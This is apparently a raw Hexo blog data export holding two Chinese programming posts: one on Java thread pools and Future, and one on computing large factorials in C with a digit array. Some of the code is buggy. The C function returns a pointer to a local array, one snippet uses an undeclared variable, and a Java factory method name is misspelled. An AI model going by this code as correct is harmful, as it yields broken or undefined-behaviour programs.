class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"flag = 0\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.flag == <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">                        System.out.println(<span class=\"string\">\"looping.\"</span>);</span><br><span class=\"line\">                        Thread.sleep(<span class=\"number\">2000</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"Interrupted\"</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"false\"</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Exception(<span class=\"string\">\"Bad flag value!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        MyCallable task1 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">0</span>);</span><br><span class=\"line\">        MyCallable task2 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">1</span>);</span><br><span class=\"line\">        MyCallable task3 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">2</span>);</span><br><span class=\"line\">        ExecutorService es = Executors.newFixedThreadPool(<span class=\"number\">3</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 提交并执行任务，任务启动时返回了一个Future对象，</span></span><br><span class=\"line\">            <span class=\"comment\">// 如果想得到任务执行的结果或者是异常可对这个Future对象进行操作</span></span><br><span class=\"line\">            Future future1 = es.submit(task1);</span><br><span class=\"line\">            <span class=\"comment\">// 获得第一个任务的结果，如果调用get方法，当前线程会等待任务执行完毕后才往下执行</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task1: \"</span> + future1.get());</span><br><span class=\"line\">            Future future2 = es.submit(task2);</span><br><span class=\"line\">            <span class=\"comment\">// 等待5秒后，再停止第二个任务。因为第二个任务进行的是无限循环</span></span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">5000</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task2 cancel: \"</span> + future2.cancel(<span class=\"keyword\">true</span>));</span><br><span class=\"line\">            <span class=\"comment\">// 获取第三个任务的输出，因为执行第三个任务会引起异常</span></span><br><span class=\"line\">            <span class=\"comment\">// 所以下面的语句将引起异常的抛出</span></span><br><span class=\"line\">            Future future3 = es.submit(task3);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task3: \"</span> + future3.get());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(e.toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 停止任务执行服务</span></span><br><span class=\"line\">        es.shutdownNow();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"execute与submit区别\"><a href=\"#execute与submit区别\" class=\"headerlink\" title=\"execute与submit区别\"></a>execute与submit区别</h2><ul>\n<li>接收的参数不一样</li>\n<li>submit有返回值，而execute没有</li>\n<li>submit方便Exception处理</li>\n<li>execute是Executor接口中唯一定义的方法；submit是ExecutorService（该接口继承Executor）中定义的方法</li>\n</ul>\n<h2 id=\"关闭线程池\"><a href=\"#关闭线程池\" class=\"headerlink\" title=\"关闭线程池\"></a>关闭线程池</h2><ul>\n<li><code>shutdown()</code> : 不会立刻停止，只是表示停止接收任务，而等待线程池中正在执行的线程结束后，才关闭线程池</li>\n<li><code>shutdownNow()</code> : 立刻关闭线程池，包括不接受任务，线程池中正在执行的任务也立刻停止。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://www.jianshu.com/p/edd7cb4eafa0\" target=\"_blank\" rel=\"external\">https://www.jianshu.com/p/edd7cb4eafa0</a></li>\n<li><a href=\"https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html\" target=\"_blank\" rel=\"external\">https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html</a></li>\n</ul>\n","excerpt":"<h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><code>Java Thread pool</code> represents a group of worker threads that are waiting for the job and reuse many times.<br>Java中创建一个线程是一个相对耗时的操作，当程序中频繁的创建和使用线程时，会产生严重的内存管理开销(significant memory management overhead)。基于这个原因，Java有了线程池的概念，在使用线程之前，创建一个线程池。当一个任务需要一个线程去运行时，程序去线程池中选择一个空闲线程去运行。当任务结束后，线程又重新放进线程池中等待下一个任务，这样就避免了频繁的创建线程，大大节省了内存管理开销。</p>\n<h2 id=\"线程池分类\"><a href=\"#线程池分类\" class=\"headerlink\" title=\"线程池分类\"></a>线程池分类</h2><p><code>fixed thread pool</code> : 固型线程池—-创建时指定创建的线程数，当任务使用完线程池中的空闲线程，则新任务将等待被占用的线程执行完任务。</p>\n<p>固定长度线程池的优点 : 用Web服务器举例说明，Web服务器需要单独的线程去处理一个HTTP请求，当出现大量的HTTP请求，超过了系统能够承受的范围，那么这个Web服务器就会停止响应所有的请求。而如果使用固定长度线程池，虽然不能立刻服务请求，但系统会尽最大能力去处理。</p>","more":"<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">WorkerThread</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String message;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">WorkerThread</span><span class=\"params\">(String s)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.message=s;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(Thread.currentThread().getName()+<span class=\"string\">\" (Start) message = \"</span>+message);</span><br><span class=\"line\">        processmessage();<span class=\"comment\">//call processmessage method that sleeps the thread for 2 seconds</span></span><br><span class=\"line\">        System.out.println(Thread.currentThread().getName()+<span class=\"string\">\" (End)\"</span>);<span class=\"comment\">//prints thread name</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">processmessage</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;  Thread.sleep(<span class=\"number\">2000</span>);  &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123; e.printStackTrace(); &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestThreadPool</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ExecutorService executor = Executors.newFixedThreadPool(<span class=\"number\">5</span>);<span class=\"comment\">//creating a pool of 5 threads</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">            Runnable worker = <span class=\"keyword\">new</span> WorkerThread(<span class=\"string\">\"\"</span> + i);</span><br><span class=\"line\">            executor.execute(worker);<span class=\"comment\">//calling execute method of ExecutorService</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        executor.shutdown();</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!executor.isTerminated()) &#123;   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Finished all threads\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>CachedThreadPool</code> : 缓存线程池，这样的线程池适合于有许多<code>short-lived</code>任务的程序。任务执行前先查看线程池中是否有当前执行线程的缓存，如果有就resue(复用),如果没有,那么需要创建一个线程来完成当前的调用。并且这类线程池内部规定能resue(复用)的线程，空闲的时间不能超过60s,一旦超过了60s,就会被移出线程池。<br><code>SingleThreadExecutor</code> : 单例执行器，这样的<code>exector</code>保证了一个时刻只有一个线程执行。<br><code>ScheduledThreadPool</code> : 调度型线程池，调度型线程池会根据Scheduled(任务列表)进行延迟执行，或者是进行周期性的执行.适用于一些周期性的工作。</p>\n<h2 id=\"创建线程池\"><a href=\"#创建线程池\" class=\"headerlink\" title=\"创建线程池\"></a>创建线程池</h2><ul>\n<li><p>创建固定型线程</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service3 = Executors.newFixedThreadPool(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建缓存型线程池</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service2 = Executors.newCacheThreadPool();</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>创建调度型线程池</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ExecutorService service4 = Executors.newScheduledThreadPool(<span class=\"number\">10</span>);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"Future-介绍\"><a href=\"#Future-介绍\" class=\"headerlink\" title=\"Future 介绍\"></a>Future 介绍</h2><p>Future表示异步计算的结果，它提供了检查计算是否完成的方法，以等待计算的完成，并检索计算的结果。Future的cancel方法可以取消任务的执行，它有一布尔参数，参数为 true 表示立即中断任务的执行，参数为 false 表示允许正在运行的任务运行完成。Future的 get 方法等待计算完成，获取计算结果。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.reapal.brave.main;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Callable;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.ExecutorService;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Future;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CallableAndFuture</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span>  <span class=\"title\">MyCallable</span>  <span class=\"keyword\">implements</span> <span class=\"title\">Callable</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyCallable</span><span class=\"params\">(<span class=\"keyword\">int</span> flag)</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.flag = flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">call</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.flag == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"flag = 0\"</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.flag == <span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">                        System.out.println(<span class=\"string\">\"looping.\"</span>);</span><br><span class=\"line\">                        Thread.sleep(<span class=\"number\">2000</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"Interrupted\"</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"string\">\"false\"</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> Exception(<span class=\"string\">\"Bad flag value!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        MyCallable task1 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">0</span>);</span><br><span class=\"line\">        MyCallable task2 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">1</span>);</span><br><span class=\"line\">        MyCallable task3 = <span class=\"keyword\">new</span> MyCallable(<span class=\"number\">2</span>);</span><br><span class=\"line\">        ExecutorService es = Executors.newFixedThreadPool(<span class=\"number\">3</span>);</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 提交并执行任务，任务启动时返回了一个Future对象，</span></span><br><span class=\"line\">            <span class=\"comment\">// 如果想得到任务执行的结果或者是异常可对这个Future对象进行操作</span></span><br><span class=\"line\">            Future future1 = es.submit(task1);</span><br><span class=\"line\">            <span class=\"comment\">// 获得第一个任务的结果，如果调用get方法，当前线程会等待任务执行完毕后才往下执行</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task1: \"</span> + future1.get());</span><br><span class=\"line\">            Future future2 = es.submit(task2);</span><br><span class=\"line\">            <span class=\"comment\">// 等待5秒后，再停止第二个任务。因为第二个任务进行的是无限循环</span></span><br><span class=\"line\">            Thread.sleep(<span class=\"number\">5000</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task2 cancel: \"</span> + future2.cancel(<span class=\"keyword\">true</span>));</span><br><span class=\"line\">            <span class=\"comment\">// 获取第三个任务的输出，因为执行第三个任务会引起异常</span></span><br><span class=\"line\">            <span class=\"comment\">// 所以下面的语句将引起异常的抛出</span></span><br><span class=\"line\">            Future future3 = es.submit(task3);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"task3: \"</span> + future3.get());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">            System.out.println(e.toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 停止任务执行服务</span></span><br><span class=\"line\">        es.shutdownNow();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"execute与submit区别\"><a href=\"#execute与submit区别\" class=\"headerlink\" title=\"execute与submit区别\"></a>execute与submit区别</h2><ul>\n<li>接收的参数不一样</li>\n<li>submit有返回值，而execute没有</li>\n<li>submit方便Exception处理</li>\n<li>execute是Executor接口中唯一定义的方法；submit是ExecutorService（该接口继承Executor）中定义的方法</li>\n</ul>\n<h2 id=\"关闭线程池\"><a href=\"#关闭线程池\" class=\"headerlink\" title=\"关闭线程池\"></a>关闭线程池</h2><ul>\n<li><code>shutdown()</code> : 不会立刻停止，只是表示停止接收任务，而等待线程池中正在执行的线程结束后，才关闭线程池</li>\n<li><code>shutdownNow()</code> : 立刻关闭线程池，包括不接受任务，线程池中正在执行的任务也立刻停止。</li>\n</ul>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"https://www.jianshu.com/p/edd7cb4eafa0\">https://www.jianshu.com/p/edd7cb4eafa0</a></li>\n<li><a href=\"https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html\">https://docs.oracle.com/javase/tutorial/essential/concurrency/pools.html</a></li>\n</ul>"},{"title":"计算两个大数乘积巧算法","date":"2016-05-24T16:00:00.000Z","_content":"**最近遇到了一个编程上的小问题，编程题目是这样的，计算一个数的阶乘，我当时就在想，这不是很简单吗，然后我随手写了串代码，如下**\n\n<!--more-->\n\n``` bash\ndouble Jie_Cheng(int i)\n{\n\tdouble the_output_number = 1;\n\tint j = 1;\n\n\tfor (j=1;j<=i;j++)    the_output_number *= j;\n\treturn the_output_number;\n}\n```\n\n**但是有人提醒我这串代码在有些编译器中只能算1-13的阶乘，我就意思到这样的代码会有溢出数据范围，然后自己想了些法子去实现，然后又去网上找别人写的代码，看了一些不太好的代码，代码多又复杂，所以没兴趣看，然后突然找到了如下代码，我认真地看着**\n\n``` bash\nconst int max = 3000;\nint f[max] = {0};\nint main ()\n{\n\tint i, j, number;\n    scanf(\"%d\",&number);\n    \n    f[0] = 1;\n    for (i=2;i<=n;i++)\n    {\n    \tint left = 0;                   //下面要用的余数\n        for (j=0;j<max;j++)\n        {\n        \tint sum = f[j] * i + left;\n            //一个数乘以另一个数的每一项\n            f[j] = sum % 10;\n            left = sum / 10;\n        }\n    }\n}\n```\n\n**大概代码就是这些，代码本身不难看懂，只是这个实现的方法是我没有想过的。这个算法设计很巧，所以有必要记录一下**\n\n**代码翻译成计算过程如下，举个乘积例子：1213 * 325，自己动手计算一下，我的老实计算步骤是这样的：**\n\n``` bash\n              1213\n           *   325\n          ------------\n              6065\n             2426\n            3639\n          ------------\n            394225\n```\n\n**那么代码怎么实现这两个数的计算的呢？首先用5 * 1213 然后将最后一位的5落下来，将剩下的 606 加在第二次用 2 * 1213 的结果上，再将6落下来，同样的道理一直到计算完。这是从计算本身的角度去设计代码，简单易懂，也便于设计代码，那么再大的数也可以实现阶乘计算了，所以最后完成的代码如下：**\n``` bash\n//本程序有待完善\n# include <stdio.h>\n# include <stdlib.h>\n\nint * JieCheng (int );\n/*计算大数阶乘\n *输出为数组（指针）\n *断点为f[i] = 10,使用该函数时可定义一个指针指向该函数返回值，\n *如函数返回值：5370923 10，最后10为断点\n *注：该函数灵活度很差，有待改善\n */\nint main ()\n{\n\tint number = 0;\n\tint * g;\n\n\twhile (1)\n\t{\n\t\tprintf(\"Please input a integer no more than 1000\\n\");\n\t\tscanf(\"%d\", &number);\n\n\t\tprintf(\"The result is:\");\n\t\tg = JieCheng(number);\n\n\t\tfor (;(*g)!=10;g++)      printf(\"%d\",*g);\n\t\tprintf(\"\\n\");\n\t}\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n\nint * JieCheng (int number)\n{\n\tint f[3000] = {0};       //待完善\n\tint i, j;\n\n\tf[0] = 1;\n\tfor (i=1;i<=number;i++)            //迭代求阶乘，从1到所求数\n\t{\n\t\tint left = 0;\n\n\t\tfor (j=0;j<3000;j++)           //数组表示所求阶乘大数的每一分数位，如个位是f[0],十位是f[1]\n\t\t{\n\t\t\tint sum = f[j] * i + left;        //具体求法在博客上\n\t\t\tf[j] = sum % 10;\n\t\t\tleft = sum / 10;\n\t\t}\n\t}\n\n\tfor (i=3000-1;;i--)    if (f[i]!=0)   break;\n\tfor (j=0;j<i/2+1;j++)\n\t{\n\t\tint a = 0;\n\t\ta = f[j];               //将数组倒置\n\t\tf[j] = f[i-j];\n\t\tf[i-j] = a;\n\t}\n\n\tf[i+1] = 10;        //设置断点，使用时以此终止输出 \n\treturn f;\n}\n\n```","source":"_posts/JieCheng.md","raw":"---\ntitle: 计算两个大数乘积巧算法\ndate: 2016-05-25\n---\n**最近遇到了一个编程上的小问题，编程题目是这样的，计算一个数的阶乘，我当时就在想，这不是很简单吗，然后我随手写了串代码，如下**\n\n<!--more-->\n\n``` bash\ndouble Jie_Cheng(int i)\n{\n\tdouble the_output_number = 1;\n\tint j = 1;\n\n\tfor (j=1;j<=i;j++)    the_output_number *= j;\n\treturn the_output_number;\n}\n```\n\n**但是有人提醒我这串代码在有些编译器中只能算1-13的阶乘，我就意思到这样的代码会有溢出数据范围，然后自己想了些法子去实现，然后又去网上找别人写的代码，看了一些不太好的代码，代码多又复杂，所以没兴趣看，然后突然找到了如下代码，我认真地看着**\n\n``` bash\nconst int max = 3000;\nint f[max] = {0};\nint main ()\n{\n\tint i, j, number;\n    scanf(\"%d\",&number);\n    \n    f[0] = 1;\n    for (i=2;i<=n;i++)\n    {\n    \tint left = 0;                   //下面要用的余数\n        for (j=0;j<max;j++)\n        {\n        \tint sum = f[j] * i + left;\n            //一个数乘以另一个数的每一项\n            f[j] = sum % 10;\n            left = sum / 10;\n        }\n    }\n}\n```\n\n**大概代码就是这些，代码本身不难看懂，只是这个实现的方法是我没有想过的。这个算法设计很巧，所以有必要记录一下**\n\n**代码翻译成计算过程如下，举个乘积例子：1213 * 325，自己动手计算一下，我的老实计算步骤是这样的：**\n\n``` bash\n              1213\n           *   325\n          ------------\n              6065\n             2426\n            3639\n          ------------\n            394225\n```\n\n**那么代码怎么实现这两个数的计算的呢？首先用5 * 1213 然后将最后一位的5落下来，将剩下的 606 加在第二次用 2 * 1213 的结果上，再将6落下来，同样的道理一直到计算完。这是从计算本身的角度去设计代码，简单易懂，也便于设计代码，那么再大的数也可以实现阶乘计算了，所以最后完成的代码如下：**\n``` bash\n//本程序有待完善\n# include <stdio.h>\n# include <stdlib.h>\n\nint * JieCheng (int );\n/*计算大数阶乘\n *输出为数组（指针）\n *断点为f[i] = 10,使用该函数时可定义一个指针指向该函数返回值，\n *如函数返回值：5370923 10，最后10为断点\n *注：该函数灵活度很差，有待改善\n */\nint main ()\n{\n\tint number = 0;\n\tint * g;\n\n\twhile (1)\n\t{\n\t\tprintf(\"Please input a integer no more than 1000\\n\");\n\t\tscanf(\"%d\", &number);\n\n\t\tprintf(\"The result is:\");\n\t\tg = JieCheng(number);\n\n\t\tfor (;(*g)!=10;g++)      printf(\"%d\",*g);\n\t\tprintf(\"\\n\");\n\t}\n\n\tsystem(\"pause\");\n\treturn 0;\n}\n\nint * JieCheng (int number)\n{\n\tint f[3000] = {0};       //待完善\n\tint i, j;\n\n\tf[0] = 1;\n\tfor (i=1;i<=number;i++)            //迭代求阶乘，从1到所求数\n\t{\n\t\tint left = 0;\n\n\t\tfor (j=0;j<3000;j++)           //数组表示所求阶乘大数的每一分数位，如个位是f[0],十位是f[1]\n\t\t{\n\t\t\tint sum = f[j] * i + left;        //具体求法在博客上\n\t\t\tf[j] = sum % 10;\n\t\t\tleft = sum / 10;\n\t\t}\n\t}\n\n\tfor (i=3000-1;;i--)    if (f[i]!=0)   break;\n\tfor (j=0;j<i/2+1;j++)\n\t{\n\t\tint a = 0;\n\t\ta = f[j];               //将数组倒置\n\t\tf[j] = f[i-j];\n\t\tf[i-j] = a;\n\t}\n\n\tf[i+1] = 10;        //设置断点，使用时以此终止输出 \n\treturn f;\n}\n\n```","slug":"JieCheng","published":1,"updated":"2017-11-21T09:18:37.693Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxh000kyp0lmjvo5gvl","content":"<p><strong>最近遇到了一个编程上的小问题，编程题目是这样的，计算一个数的阶乘，我当时就在想，这不是很简单吗，然后我随手写了串代码，如下</strong></p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">double Jie_Cheng(int i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tdouble the_output_number = 1;</span><br><span class=\"line\">\tint j = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (j=1;j&lt;=i;j++)    the_output_number *= j;</span><br><span class=\"line\">\t<span class=\"built_in\">return</span> the_output_number;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>但是有人提醒我这串代码在有些编译器中只能算1-13的阶乘，我就意思到这样的代码会有溢出数据范围，然后自己想了些法子去实现，然后又去网上找别人写的代码，看了一些不太好的代码，代码多又复杂，所以没兴趣看，然后突然找到了如下代码，我认真地看着</strong></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const int max = 3000;</span><br><span class=\"line\">int f[max] = &#123;0&#125;;</span><br><span class=\"line\">int <span class=\"function\"><span class=\"title\">main</span></span> ()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i, j, number;</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;number);</span><br><span class=\"line\">    </span><br><span class=\"line\">    f[0] = 1;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=2;i&lt;=n;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tint left = 0;                   //下面要用的余数</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=0;j&lt;max;j++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        \tint sum = f[j] * i + left;</span><br><span class=\"line\">            //一个数乘以另一个数的每一项</span><br><span class=\"line\">            f[j] = sum % 10;</span><br><span class=\"line\">            left = sum / 10;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    